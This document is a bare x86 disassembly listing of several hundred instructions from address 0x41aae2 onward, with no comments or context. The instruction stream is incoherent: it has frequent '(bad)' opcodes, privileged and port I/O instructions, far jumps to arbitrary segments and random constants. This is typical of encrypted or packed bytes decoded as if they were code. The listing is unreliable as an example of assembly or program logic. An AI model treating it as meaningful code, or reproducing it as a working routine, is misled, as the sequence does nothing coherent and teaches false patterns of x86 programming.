  41aae2:	fstp   QWORD PTR [edi+ebp*2]
  41aae5:	rcl    ecx,1
  41aae7:	fadd   DWORD PTR [ecx]
  41aae9:	jmp    0x7b68:0xd64e5b3d
  41aaf0:	gs cld 
  41aaf2:	pop    esp
  41aaf3:	retf   
  41aaf4:	dec    eax
  41aaf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aaf6:	test   DWORD PTR [esi],ecx
  41aaf8:	adc    al,0x8a
  41aafa:	dec    esi
  41aafb:	push   esi
  41aafc:	add    DWORD PTR [edx-0x2c],eax
  41aaff:	xor    dh,BYTE PTR [ebx-0x15]
  41ab02:	cld    
  41ab03:	push   ss
  41ab04:	fcomi  st,st(3)
  41ab06:	sub    edi,esp
  41ab08:	pop    ecx
  41ab09:	xor    DWORD PTR [ecx],ebx
  41ab0b:	mov    WORD PTR [ebx-0x70],ds
  41ab0e:	popa   
  41ab0f:	sub    eax,ebp
  41ab11:	mov    edi,0x26e53bfd
  41ab16:	pop    ds
  41ab17:	lahf   
  41ab18:	jns    0x41ab27
  41ab1a:	xchg   BYTE PTR [eax],cl
  41ab1c:	jne    0x41ab12
  41ab1e:	loop   0x41ab55
  41ab20:	cwde   
  41ab21:	mov    edx,0x619b4c13
  41ab26:	inc    edx
  41ab27:	stc    
  41ab28:	adc    edi,DWORD PTR [ebp+0x63ae25b7]
  41ab2e:	sbb    eax,0x9c2ace47
  41ab33:	sub    BYTE PTR [eax+0x1f],dl
  41ab36:	pop    esi
  41ab37:	jp     0x41ab1d
  41ab39:	retf   0x8e5d
  41ab3c:	xor    dh,0x7b
  41ab3f:	iret   
  41ab40:	sbb    esp,DWORD PTR [edi+0x58]
  41ab43:	push   es
  41ab44:	inc    ebp
  41ab45:	xchg   edx,eax
  41ab46:	jecxz  0x41abac
  41ab48:	adc    BYTE PTR [ecx],dl
  41ab4a:	ins    DWORD PTR es:[edi],dx
  41ab4b:	jg     0x41aaf7
  41ab4d:	add    BYTE PTR [ebp-0x2b91bd44],ah
  41ab53:	and    DWORD PTR [edx],edx
  41ab55:	jle    0x41ab71
  41ab57:	pop    edi
  41ab58:	dec    esi
  41ab59:	(bad)  
  41ab5a:	cmp    al,0xf2
  41ab5c:	sub    BYTE PTR [ecx+0xe],0xe6
  41ab60:	and    edi,esp
  41ab62:	retf   
  41ab63:	aas    
  41ab64:	test   al,0xc4
  41ab66:	add    cl,dh
  41ab68:	mov    edx,0x882349d3
  41ab6d:	scas   eax,DWORD PTR es:[edi]
  41ab6e:	test   al,0xd3
  41ab70:	jge    0x41abbe
  41ab72:	mov    esi,0x1d828032
  41ab77:	dec    edx
  41ab78:	stos   BYTE PTR es:[edi],al
  41ab79:	adc    ah,BYTE PTR [ecx-0x11]
  41ab7c:	aam    0x5c
  41ab7e:	data16 jno 0x41abb3
  41ab81:	mov    ds:0x2e406a0a,al
  41ab86:	retf   0x1f
  41ab89:	dec    ebp
  41ab8a:	lods   al,BYTE PTR ds:[esi]
  41ab8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab8c:	mov    eax,ds:0xec95af13
  41ab91:	cli    
  41ab92:	adc    al,0xe8
  41ab94:	sub    esi,esp
  41ab96:	xchg   BYTE PTR [ebp-0x66245d82],bl
  41ab9c:	(bad)  
  41ab9d:	cli    
  41ab9e:	jnp    0x41ab82
  41aba0:	adc    dh,BYTE PTR [eax-0x39bc5890]
  41aba6:	and    eax,0x436cc4de
  41abab:	in     al,0xab
  41abad:	inc    edi
  41abae:	push   esp
  41abaf:	gs lock mov al,gs:0x78c0bdb2
  41abb7:	stos   BYTE PTR es:[edi],al
  41abb8:	jp     0x41ab76
  41abba:	aam    0x3d
  41abbc:	cdq    
  41abbd:	lods   al,BYTE PTR ds:[esi]
  41abbe:	push   ds
  41abbf:	(bad)  
  41abc0:	jg     0x41abb8
  41abc2:	push   0xffffff9b
  41abc4:	loope  0x41abf3
  41abc6:	and    DWORD PTR [ebx+0x6a382eae],ecx
  41abcc:	imul   eax,ebx,0x7a9d1c60
  41abd2:	jb     0x41ab5c
  41abd4:	xchg   DWORD PTR [ecx+0x43f6a2c3],eax
  41abda:	mov    dl,0xc7
  41abdc:	add    BYTE PTR [esi],cl
  41abde:	mov    eax,0x598f8364
  41abe3:	out    0xdf,eax
  41abe5:	mov    ds:0xac0c0c80,eax
  41abea:	mov    esi,0x684b1f76
  41abef:	je     0x41abd8
  41abf1:	out    0x3d,al
  41abf3:	es sub al,0x2d
  41abf6:	pop    edx
  41abf7:	push   0xffffffe9
  41abf9:	dec    eax
  41abfa:	lds    ebp,FWORD PTR [esi]
  41abfc:	arpl   WORD PTR [edi],di
  41abfe:	out    dx,eax
  41abff:	outs   dx,BYTE PTR ds:[esi]
  41ac00:	outs   dx,DWORD PTR ds:[esi]
  41ac01:	xchg   ecx,eax
  41ac02:	outs   dx,BYTE PTR ds:[esi]
  41ac03:	test   al,0x6c
  41ac05:	jno    0x41abac
  41ac07:	dec    ebp
  41ac08:	and    eax,0xf44a9e09
  41ac0d:	stos   DWORD PTR es:[edi],eax
  41ac0e:	push   esp
  41ac0f:	xchg   DWORD PTR [eax+0x4b913764],ebx
  41ac15:	sahf   
  41ac16:	popf   
  41ac17:	jnp    0x41abe7
  41ac19:	mov    ecx,0x396c08ed
  41ac1e:	or     BYTE PTR ds:[edi+0x15],dh
  41ac22:	or     DWORD PTR ds:[edi],0x60f90e76
  41ac29:	mov    bl,0x1b
  41ac2b:	adc    eax,0xbcc41f37
  41ac30:	push   edi
  41ac31:	xchg   esi,eax
  41ac32:	adc    DWORD PTR [ebx-0x482eb9],ebp
  41ac38:	pop    esi
  41ac39:	xchg   ebx,eax
  41ac3a:	push   cs
  41ac3b:	cmc    
  41ac3c:	mov    bh,BYTE PTR [edx+ebx*1]
  41ac3f:	push   esp
  41ac40:	out    0x19,al
  41ac42:	das    
  41ac43:	arpl   WORD PTR [ebx],bx
  41ac45:	inc    ecx
  41ac46:	nop
  41ac47:	jp     0x41ac64
  41ac49:	shl    BYTE PTR [esp+edx*1],1
  41ac4c:	and    eax,0x2ff747a2
  41ac51:	add    DWORD PTR [esi-0x5037b69a],edx
  41ac57:	mov    ebp,0x3ca9747c
  41ac5c:	jne    0x41ac72
  41ac5e:	(bad)  
  41ac5f:	adc    ebp,DWORD PTR [edx+0x76913afe]
  41ac65:	cwde   
  41ac66:	int3   
  41ac67:	adc    eax,DWORD PTR [edi+0x6b693f35]
  41ac6d:	div    esi
  41ac6f:	test   DWORD PTR [eax+0x197da58d],edx
  41ac75:	(bad)  
  41ac76:	retf   
  41ac77:	push   ecx
  41ac78:	stos   DWORD PTR es:[edi],eax
  41ac79:	(bad)  
  41ac7a:	pop    edi
  41ac7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac7c:	dec    eax
  41ac7d:	jl     0x41ac2e
  41ac7f:	jo     0x41aca2
  41ac81:	and    ebp,DWORD PTR [ebp-0x13]
  41ac84:	ins    BYTE PTR es:[edi],dx
  41ac85:	fisttp WORD PTR [esi]
  41ac87:	pop    esp
  41ac88:	pop    ebp
  41ac89:	xchg   al,dl
  41ac8b:	add    BYTE PTR [esi+0x6b],ah
  41ac8e:	das    
  41ac8f:	xor    ebx,DWORD PTR [ecx]
  41ac91:	inc    ebp
  41ac92:	or     eax,0x84cddf5e
  41ac97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac98:	add    bh,BYTE PTR [edi-0x25f29b94]
  41ac9e:	inc    eax
  41ac9f:	int3   
  41aca0:	nop
  41aca1:	and    DWORD PTR [edi-0x17b8334d],esp
  41aca7:	test   DWORD PTR [edi-0x37046483],ebx
  41acad:	ins    DWORD PTR es:[edi],dx
  41acae:	std    
  41acaf:	iret   
  41acb0:	out    0xa5,eax
  41acb2:	fnop   
  41acb4:	mov    eax,0x38f08bdb
  41acb9:	gs jecxz 0x41ad03
  41acbc:	mov    ?,esp
  41acbe:	mov    bh,0xd6
  41acc0:	cmc    
  41acc1:	xchg   DWORD PTR [eax],esp
  41acc3:	pop    edx
  41acc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acc5:	jo     0x41ad0f
  41acc7:	push   esi
  41acc8:	into   
  41acc9:	loopne 0x41ad20
  41accb:	cmc    
  41accc:	mov    ch,0xa9
  41acce:	add    edi,DWORD PTR [ecx]
  41acd0:	push   ebx
  41acd1:	leave  
  41acd2:	mov    ah,0x4a
  41acd4:	mov    ah,0xe2
  41acd6:	inc    edx
  41acd7:	or     BYTE PTR [ecx],ch
  41acd9:	sti    
  41acda:	mov    esp,0x72f63947
  41acdf:	jle    0x41acce
  41ace1:	inc    ecx
  41ace2:	loope  0x41ac96
  41ace4:	mov    al,0x5f
  41ace6:	add    BYTE PTR [edi],bl
  41ace8:	in     eax,dx
  41ace9:	adc    eax,0x604c2c07
  41acee:	shr    DWORD PTR [esi+0x32],cl
  41acf1:	jno    0x41ac91
  41acf3:	mov    es,WORD PTR [edi+0x5]
  41acf6:	and    DWORD PTR [ebx*1-0x53da7f86],edx
  41acfd:	mov    gs,WORD PTR [edx+ebp*1+0x3d]
  41ad01:	sub    ebp,ecx
  41ad03:	pop    ebx
  41ad04:	loop   0x41ad67
  41ad06:	test   BYTE PTR [ebp+0x74bc77db],ah
  41ad0c:	cmp    BYTE PTR [edi-0x7b],0x4
  41ad10:	adc    al,0x43
  41ad12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad13:	repz and esp,ebx
  41ad16:	xor    eax,0xfb5d225f
  41ad1b:	xor    BYTE PTR ds:0x6f30a6ee,cl
  41ad21:	sub    edx,DWORD PTR [ebp-0x12]
  41ad24:	hlt    
  41ad25:	das    
  41ad26:	loope  0x41ad7a
  41ad28:	(bad)  
  41ad29:	(bad)  [ecx]
  41ad2b:	jmp    0x41ad35
  41ad2d:	mov    ebp,0x9da11162
  41ad32:	call   0x8bf24539
  41ad37:	xor    eax,DWORD PTR [ebx+0x5a]
  41ad3a:	push   ss
  41ad3b:	arpl   WORD PTR [edi],cx
  41ad3d:	mov    ecx,DWORD PTR [edi+0x795b8f6]
  41ad43:	pop    ebx
  41ad44:	(bad)  [eax+0x5a60b37]
  41ad4a:	or     esp,eax
  41ad4c:	sbb    eax,0xdc0ed6a1
  41ad51:	pop    edx
  41ad52:	xchg   ebx,eax
  41ad53:	cmp    al,0x2a
  41ad55:	push   0x62
  41ad57:	rcl    DWORD PTR [eax+0x96e1072],cl
  41ad5d:	and    eax,0xdc906891
  41ad62:	or     BYTE PTR [ebp-0x3c],dl
  41ad65:	fwait
  41ad66:	inc    edi
  41ad67:	add    al,0x7c
  41ad69:	jne    0x41ad7b
  41ad6b:	sbb    BYTE PTR [edx-0x1e47750d],bh
  41ad71:	call   0x37e99531
  41ad76:	cmp    eax,DWORD PTR [edx+0x4e]
  41ad79:	mov    dh,0xed
  41ad7b:	cmc    
  41ad7c:	jg     0x41ad94
  41ad7e:	stos   DWORD PTR es:[edi],eax
  41ad7f:	stos   DWORD PTR es:[edi],eax
  41ad80:	jnp    0x41ad9b
  41ad82:	mov    edi,0x114375e4
  41ad87:	jae    0x41ad39
  41ad89:	or     ch,BYTE PTR [esi]
  41ad8b:	fdiv   st,st(5)
  41ad8d:	cli    
  41ad8e:	pop    ebx
  41ad8f:	cs pop ebp
  41ad91:	(bad)  
  41ad92:	iret   
  41ad93:	pop    esi
  41ad94:	outs   dx,BYTE PTR ds:[esi]
  41ad95:	mov    dl,0x59
  41ad97:	and    DWORD PTR [esi-0x2a],ebx
  41ad9a:	or     DWORD PTR [edi],esi
  41ad9c:	out    0x47,eax
  41ad9e:	push   esi
  41ad9f:	mov    ebp,0x90ee1c6a
  41ada4:	cdq    
  41ada5:	cmp    edx,eax
  41ada7:	mov    esi,0x1d4d10c6
  41adac:	(bad)
  41adb1:	clc    
  41adb2:	xchg   edi,eax
  41adb3:	test   eax,esi
  41adb5:	imul   ebp,eax,0x44a412ed
  41adbb:	pop    ebp
  41adbc:	retf   
  41adbd:	or     eax,0xbaf81b77
  41adc2:	(bad)  
  41adc3:	hlt    
  41adc4:	test   eax,0xb8a2da46
  41adc9:	out    0xbd,al
  41adcb:	and    al,ch
  41adcd:	dec    esi
  41adce:	test   bh,dl
  41add0:	call   0xb13b:0x7b08e2ec
  41add7:	test   DWORD PTR [eax],edx
  41add9:	xor    BYTE PTR [ecx+0x4fb035cb],bl
  41addf:	mov    DWORD PTR [eax+ecx*4+0x5e],esi
  41ade3:	test   BYTE PTR [ecx-0x78],ch
  41ade6:	popf   
  41ade7:	js     0x41ae0b
  41ade9:	add    al,0x3
  41adeb:	push   ebp
  41adec:	je     0x41adf8
  41adee:	iret   
  41adef:	or     eax,0x1e725023
  41adf4:	jmp    0x9b0c:0xbe16742a
  41adfb:	pop    ebp
  41adfc:	inc    edx
  41adfd:	scas   eax,DWORD PTR es:[edi]
  41adfe:	(bad)  
  41adff:	sub    ecx,DWORD PTR [edx+0x20828948]
  41ae05:	popa   
  41ae06:	js     0x41ade9
  41ae08:	stc    
  41ae09:	dec    ebx
  41ae0a:	dec    ebx
  41ae0b:	sti    
  41ae0c:	jb     0x41ada8
  41ae0e:	pop    es
  41ae0f:	pop    esp
  41ae10:	xchg   BYTE PTR [ebp-0x54],bl
  41ae13:	inc    ecx
  41ae14:	sbb    ebp,esp
  41ae16:	retf   0xb0c
  41ae19:	pop    ds
  41ae1a:	ficom  WORD PTR [esi]
  41ae1c:	popa   
  41ae1d:	add    BYTE PTR [esi],ch
  41ae1f:	outs   dx,DWORD PTR ds:[esi]
  41ae20:	in     eax,dx
  41ae21:	fstp   TBYTE PTR [ebp-0x71e00847]
  41ae27:	xchg   BYTE PTR [edx+0xc926053],ah
  41ae2d:	mov    al,ds:0x856f8a99
  41ae32:	adc    BYTE PTR ds:0x3c067a54,ah
  41ae38:	ror    BYTE PTR [ebx+0x59],0x2b
  41ae3c:	mov    al,ds:0x105efc0f
  41ae41:	and    dl,BYTE PTR [edx-0x36]
  41ae44:	inc    eax
  41ae45:	inc    eax
  41ae46:	mov    eax,0x4e91a435
  41ae4b:	push   esi
  41ae4c:	(bad)  
  41ae4d:	jno    0x41ae76
  41ae4f:	scas   al,BYTE PTR es:[edi]
  41ae50:	adc    eax,0x69ec158c
  41ae55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae56:	addr16 cmp edi,edi
  41ae59:	jmp    0x41ade4
  41ae5b:	shl    DWORD PTR [ecx],0x65
  41ae5e:	fist   DWORD PTR gs:[ecx+0xc]
  41ae62:	add    bh,bl
  41ae64:	push   ecx
  41ae65:	inc    esi
  41ae66:	lds    esp,FWORD PTR [eax+0x5a]
  41ae69:	cwde   
  41ae6a:	imul   ebx,ebp,0xda39bff5
  41ae70:	push   eax
  41ae71:	push   es
  41ae72:	xchg   BYTE PTR [esi],al
  41ae74:	outs   dx,DWORD PTR ds:[esi]
  41ae75:	fsub   DWORD PTR [edi-0x5a]
  41ae78:	mov    cs,WORD PTR [esi+0x36]
  41ae7b:	jmp    0x41aef2
  41ae7d:	cmp    cl,bl
  41ae7f:	push   ebx
  41ae80:	shl    BYTE PTR [ecx],0xb
  41ae83:	xchg   DWORD PTR [eax],ebx
  41ae85:	jle    0x41aedf
  41ae87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae88:	test   DWORD PTR [ebx],ecx
  41ae8a:	jp     0x41af03
  41ae8c:	sahf   
  41ae8d:	fnstenv [edi+0x52]
  41ae90:	mov    bl,0x21
  41ae92:	lahf   
  41ae93:	sub    eax,0x5946efde
  41ae98:	or     eax,0x99a6969a
  41ae9d:	in     eax,dx
  41ae9e:	xchg   edx,eax
  41ae9f:	jl     0x41ae6a
  41aea1:	aam    0x8f
  41aea3:	test   dl,bl
  41aea5:	(bad)  
  41aea7:	dec    esi
  41aea8:	or     eax,0xfa63e3e6
  41aead:	enter  0xbf9a,0x29
  41aeb1:	iret   
  41aeb2:	outs   dx,WORD PTR ds:[esi]
  41aeb4:	dec    esp
  41aeb5:	jo     0x41af15
  41aeb7:	aam    0x4f
  41aeb9:	dec    eax
  41aeba:	mov    ecx,0xef3d9540
  41aebf:	xchg   edi,eax
  41aec0:	data16 neg bl
  41aec3:	and    ecx,edi
  41aec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aec6:	lods   al,BYTE PTR ds:[esi]
  41aec7:	xor    al,0xd1
  41aec9:	mov    bl,0xe0
  41aecb:	popa   
  41aecc:	leave  
  41aecd:	sahf   
  41aece:	ret    0x3cdd
  41aed1:	cmp    cl,BYTE PTR [eax+0x50]
  41aed4:	or     dh,BYTE PTR [ebx]
  41aed6:	inc    eax
  41aed7:	fisttp WORD PTR [eax+0x4e]
  41aeda:	imul   dl
  41aedc:	shl    DWORD PTR [edx],1
  41aede:	push   cs
  41aedf:	out    0x3a,eax
  41aee1:	dec    edx
  41aee2:	aaa    
  41aee3:	inc    esi
  41aee4:	xor    dh,BYTE PTR [edx+0x37]
  41aee7:	dec    ebx
  41aee8:	inc    esp
  41aee9:	xchg   ecx,ebp
  41aeeb:	or     eax,0xffffffe4
  41aeee:	scas   eax,DWORD PTR es:[edi]
  41aeef:	xlat   BYTE PTR ds:[ebx]
  41aef0:	dec    BYTE PTR [eax-0x25961727]
  41aef6:	mov    esp,0xc10413a2
  41aefb:	fcom   st(6)
  41aefd:	jg     0x41aeb0
  41aeff:	sbb    DWORD PTR [ecx+0x31],edi
  41af02:	scas   al,BYTE PTR es:[edi]
  41af03:	into   
  41af04:	and    eax,0xf5b55f50
  41af09:	clc    
  41af0a:	dec    edx
  41af0b:	push   edx
  41af0c:	jp     0x41aec9
  41af0e:	cdq    
  41af0f:	popa   
  41af10:	fwait
  41af11:	int3   
  41af12:	sahf   
  41af13:	(bad)  
  41af15:	jns    0x41aef5
  41af17:	push   cs
  41af18:	test   DWORD PTR [ebp+0x63],0xc5745694
  41af1f:	mov    ch,0xca
  41af21:	test   eax,0x652bbccf
  41af26:	pop    es
  41af27:	int3   
  41af28:	pop    ebx
  41af29:	ror    DWORD PTR [edi+0x36],cl
  41af2c:	hlt    
  41af2d:	mov    DWORD PTR ds:0x5a18d3aa,eax
  41af33:	and    eax,0x9e7fb018
  41af38:	popf   
  41af39:	test   al,0xa6
  41af3b:	lods   al,BYTE PTR ds:[esi]
  41af3c:	xchg   edx,eax
  41af3d:	js     0x41af40
  41af3f:	pop    ss
  41af40:	dec    esp
  41af41:	fcomp  DWORD PTR [ebx+0x1]
  41af44:	ins    DWORD PTR es:[edi],dx
  41af45:	or     al,0x88
  41af47:	cmp    eax,0x32136d5c
  41af4c:	sbb    eax,0xec55e2bd
  41af51:	jae    0x41af4b
  41af53:	into   
  41af54:	mov    dh,BYTE PTR [ecx]
  41af56:	mov    ds:0x12347a77,al
  41af5b:	and    eax,0x17c383c0
  41af60:	fdiv   QWORD PTR [ecx+0x4693416e]
  41af66:	inc    eax
  41af67:	ficomp WORD PTR [ebx+0x122e9bbd]
  41af6d:	lods   al,BYTE PTR ds:[esi]
  41af6e:	fidiv  WORD PTR [bx+di-0x1a]
  41af72:	push   ss
  41af73:	or     al,0x29
  41af75:	fdivr  st,st(3)
  41af77:	push   edi
  41af78:	lds    edi,FWORD PTR [ecx-0x45]
  41af7b:	jmp    0x41af74
  41af7d:	outs   dx,DWORD PTR ds:[esi]
  41af7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af7f:	in     al,dx
  41af80:	out    0x90,al
  41af82:	fnstsw WORD PTR [edx-0x20c2eacf]
  41af88:	(bad)  
  41af89:	cmp    ah,BYTE PTR [edi+ebx*2-0x1f28f82c]
  41af90:	aam    0xfc
  41af92:	cmp    ah,BYTE PTR [ebx+0x473f6835]
  41af98:	fwait
  41af99:	outs   dx,BYTE PTR ds:[esi]
  41af9a:	mov    BYTE PTR [edx+0x2cf58f5b],bl
  41afa0:	xor    DWORD PTR ds:[edi],0xadc128e0
  41afa7:	pop    edi
  41afa8:	cmp    bl,ah
  41afaa:	call   0x39e7:0x2a60494d
  41afb1:	cmp    ah,BYTE PTR [edx+edx*2-0x6]
  41afb5:	(bad)  
  41afb7:	mov    al,0x61
  41afb9:	mov    al,0x87
  41afbb:	inc    esi
  41afbc:	mov    WORD PTR [ecx-0x697aadbe],gs
  41afc2:	xchg   ebx,eax
  41afc3:	outs   dx,DWORD PTR ds:[esi]
  41afc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afc5:	popa   
  41afc6:	pop    ecx
  41afc7:	lea    edi,[eax]
  41afc9:	cli    
  41afca:	and    al,BYTE PTR [ecx-0x20304baa]
  41afd0:	pop    esp
  41afd1:	xor    al,0x54
  41afd3:	inc    eax
  41afd4:	ss mov eax,0x3bcb9313
  41afda:	sbb    eax,0x32f6be0f
  41afdf:	xor    ebx,DWORD PTR [ebx-0x49]
  41afe2:	jge    0x41afc5
  41afe4:	and    ecx,DWORD PTR [edi]
  41afe6:	(bad)  
  41afe7:	push   ebx
  41afe8:	mov    dh,0x70
  41afea:	jmp    0x41af7f
  41afec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afed:	mov    bl,0xd8
  41afef:	je     0x41afdf
  41aff1:	aaa    
  41aff2:	shl    DWORD PTR [edx+0x3f],cl
  41aff5:	sti    
  41aff6:	jo     0x41afb3
  41aff8:	imul   DWORD PTR [ebx+0x46]
  41affb:	push   ecx
  41affc:	jl     0x41afbc
  41affe:	jb     0x41aff4
  41b000:	xchg   esp,eax
  41b001:	ja     0x41af8e
  41b003:	adc    eax,ebx
  41b005:	sub    DWORD PTR [edx-0x7a],0x3c
  41b009:	pop    eax
  41b00a:	and    ebp,DWORD PTR [ecx+0x7]
  41b00d:	int3   
  41b00e:	mov    dh,0x56
  41b010:	dec    edx
  41b011:	push   ecx
  41b012:	inc    ebx
  41b013:	dec    ecx
  41b014:	mov    BYTE PTR [edx-0x4c],dh
  41b017:	icebp  
  41b018:	jae    0x41b057
  41b01a:	scas   eax,DWORD PTR es:[edi]
  41b01b:	adc    DWORD PTR [ebx],ebp
  41b01d:	retf   0x86de
  41b020:	aam    0x3a
  41b022:	loope  0x41b023
  41b024:	ins    DWORD PTR es:[edi],dx
  41b025:	dec    edi
  41b026:	and    BYTE PTR [edi],cl
  41b028:	adc    BYTE PTR [eax-0xb],bl
  41b02b:	xlat   BYTE PTR ds:[ebx]
  41b02c:	aaa    
  41b02d:	pushf  
  41b02e:	int3   
  41b02f:	push   cs
  41b030:	add    DWORD PTR [edi-0x6d],ebx
  41b033:	xchg   ebp,eax
  41b034:	ret    0x215
  41b037:	xchg   DWORD PTR [ebx],ebp
  41b039:	dec    esp
  41b03a:	or     bl,BYTE PTR ds:0x1a2974cb
  41b040:	(bad)  
  41b042:	xchg   ebp,eax
  41b043:	popa   
  41b044:	(bad)  
  41b045:	fdiv   QWORD PTR [edx]
  41b048:	call   FWORD PTR [ebx]
  41b04a:	mov    al,0x6
  41b04c:	cs dec ebx
  41b04e:	sub    DWORD PTR [ebp+0x7be00fff],edi
  41b054:	sbb    BYTE PTR [edx*2+0x3b0bf75d],cl
  41b05b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b05c:	dec    esp
  41b05d:	cwde   
  41b05e:	and    edx,DWORD PTR [edx-0x7b]
  41b061:	cmp    al,0xc1
  41b063:	inc    edx
  41b064:	pusha  
  41b065:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b066:	(bad)  [ecx+0x47]
  41b069:	mov    ah,0xb5
  41b06b:	out    dx,al
  41b06c:	scas   al,BYTE PTR es:[edi]
  41b06d:	test   DWORD PTR [eax-0x7c6f31f5],0x53f6d3d
  41b077:	(bad)  
  41b078:	jne    0x41b092
  41b07a:	in     al,0xf2
  41b07c:	mov    al,0x39
  41b07e:	or     esi,DWORD PTR [edi+esi*2+0x52]
  41b082:	cli    
  41b083:	popa   
  41b084:	cli    
  41b085:	inc    edx
  41b086:	sub    al,0x3
  41b088:	push   ecx
  41b089:	inc    ebx
  41b08a:	mov    eax,esi
  41b08c:	(bad)  
  41b08d:	xchg   edi,eax
  41b08e:	jne    0x41b024
  41b090:	les    edi,FWORD PTR [esi]
  41b092:	xchg   edx,eax
  41b093:	ja     0x41b03e
  41b095:	xor    bl,BYTE PTR [ebx+0x6b]
  41b098:	xchg   esp,eax
  41b099:	or     DWORD PTR [eax],eax
  41b09b:	xchg   edi,eax
  41b09c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b09d:	mov    ecx,0x8fff5b0
  41b0a2:	cmp    BYTE PTR [ebp+0x4b],0x3f
  41b0a6:	imul   DWORD PTR [eax+0x5b]
  41b0a9:	fstp   DWORD PTR [ecx]
  41b0ab:	fwait
  41b0ac:	add    DWORD PTR [edx],ebp
  41b0ae:	xor    al,0x4d
  41b0b0:	out    0x3e,al
  41b0b2:	lea    esp,[ebp-0x42219218]
  41b0b8:	fnstsw ax
  41b0ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0bb:	or     al,0xbf
  41b0bd:	pop    es
  41b0be:	icebp  
  41b0bf:	retf   0xfd9f
  41b0c2:	pusha  
  41b0c3:	lods   al,BYTE PTR ds:[esi]
  41b0c4:	xor    bh,al
  41b0c6:	dec    eax
  41b0c7:	or     ah,BYTE PTR [edx+0xe]
  41b0ca:	data16 jnp 0x41b148
  41b0cd:	out    0x71,eax
  41b0cf:	nop
  41b0d0:	sahf   
  41b0d1:	push   cs
  41b0d2:	jl     0x41b0e6
  41b0d4:	and    al,cl
  41b0d6:	arpl   dx,dx
  41b0d8:	lock adc esi,esi
  41b0db:	iret   
  41b0dc:	pop    es
  41b0dd:	in     eax,dx
  41b0de:	test   BYTE PTR [ebp-0x5e1bc4a4],0xd8
  41b0e5:	ret    0x7a4d
  41b0e8:	sar    BYTE PTR [eax-0xa],1
  41b0eb:	inc    esp
  41b0ec:	lods   eax,DWORD PTR ds:[esi]
  41b0ed:	scas   eax,DWORD PTR es:[edi]
  41b0ee:	popf   
  41b0ef:	mov    eax,0xe166ecb5
  41b0f4:	xchg   ecx,edi
  41b0f6:	pop    ebx
  41b0f7:	addr16 pop ss
  41b0f9:	in     al,0xda
  41b0fb:	sbb    eax,0x8f71f56b
  41b100:	inc    ebp
  41b101:	enter  0xc524,0xf9
  41b105:	int3   
  41b106:	push   ebx
  41b107:	xchg   ebx,ecx
  41b109:	sbb    eax,0x4c92034d
  41b10e:	fld    QWORD PTR [edi+0x7a1987b2]
  41b114:	jg     0x41b12a
  41b116:	imul   edi,DWORD PTR [ecx-0x25],0x549ba4db
  41b11d:	out    dx,al
  41b11e:	sbb    eax,0x8c69cf7d
  41b123:	mov    dl,0x6e
  41b125:	loopne 0x41b156
  41b127:	mov    cl,0x5f
  41b129:	into   
  41b12a:	xor    eax,0xcfe8d62d
  41b12f:	add    eax,0xd4de4666
  41b134:	sysret 
  41b136:	pop    esp
  41b137:	jno    0x41b15e
  41b139:	adc    DWORD PTR [ebx],ebp
  41b13b:	call   0x3c86:0x75c5841d
  41b142:	shr    DWORD PTR [ecx],0x47
  41b145:	out    dx,eax
  41b146:	xchg   ecx,eax
  41b147:	outs   dx,BYTE PTR ds:[esi]
  41b148:	jbe    0x41b0ed
  41b14a:	into   
  41b14b:	mov    dl,ah
  41b14d:	mov    ds:0x70bd539e,al
  41b152:	mov    dl,0x36
  41b154:	in     al,0xaa
  41b156:	jecxz  0x41b150
  41b158:	pop    edx
  41b159:	pop    ds
  41b15a:	cmp    bh,BYTE PTR [esi-0x18d8c36f]
  41b160:	lods   al,BYTE PTR ds:[esi]
  41b161:	or     eax,0xd9d25c7f
  41b166:	cld    
  41b167:	sahf   
  41b168:	das    
  41b169:	cmp    bl,bl
  41b16b:	mov    bl,0x33
  41b16d:	mov    eax,0x6d65103e
  41b172:	cmp    DWORD PTR [ecx+0x1c],edx
  41b175:	pop    ds
  41b176:	je     0x41b1d8
  41b178:	imul   edi,ebx,0xffffffee
  41b17b:	sub    BYTE PTR [ecx+ecx*2+0x1e0d824f],cl
  41b182:	call   0x8061:0xb32c2ee7
  41b189:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b18a:	mov    ah,0x36
  41b18c:	and    eax,0x58acd294
  41b191:	sub    al,0xa6
  41b193:	xchg   ebp,eax
  41b194:	adc    DWORD PTR cs:[ebx+0x4a],ecx
  41b198:	shl    DWORD PTR [eax],1
  41b19a:	test   al,0x94
  41b19c:	xchg   BYTE PTR [ebp+0x40],ah
  41b19f:	inc    ebx
  41b1a0:	add    eax,0x97952361
  41b1a5:	mov    eax,0x1bb48aec
  41b1aa:	sub    BYTE PTR [ebp+0x46],ch
  41b1ad:	addr16 mov edx,0x1d13818c
  41b1b3:	mov    bl,0x71
  41b1b5:	and    al,0xcf
  41b1b7:	mov    eax,ds:0x599cf5a2
  41b1bc:	(bad)  
  41b1be:	dec    ecx
  41b1bf:	(bad)  
  41b1c0:	addr16 das 
  41b1c2:	popf   
  41b1c3:	push   edx
  41b1c4:	xchg   esi,edi
  41b1c6:	pop    ebx
  41b1c7:	push   es
  41b1c8:	mov    ds:0x881e5e6e,eax
  41b1cd:	in     eax,dx
  41b1ce:	fidiv  DWORD PTR [edi+0x36]
  41b1d1:	stc    
  41b1d2:	and    DWORD PTR ds:0xcf41ff82,ebp
  41b1d8:	jbe    0x41b1ae
  41b1da:	pop    ds
  41b1db:	in     eax,dx
  41b1dc:	outs   dx,BYTE PTR ds:[esi]
  41b1dd:	dec    eax
  41b1de:	das    
  41b1df:	cmp    dl,bl
  41b1e1:	xchg   ebx,eax
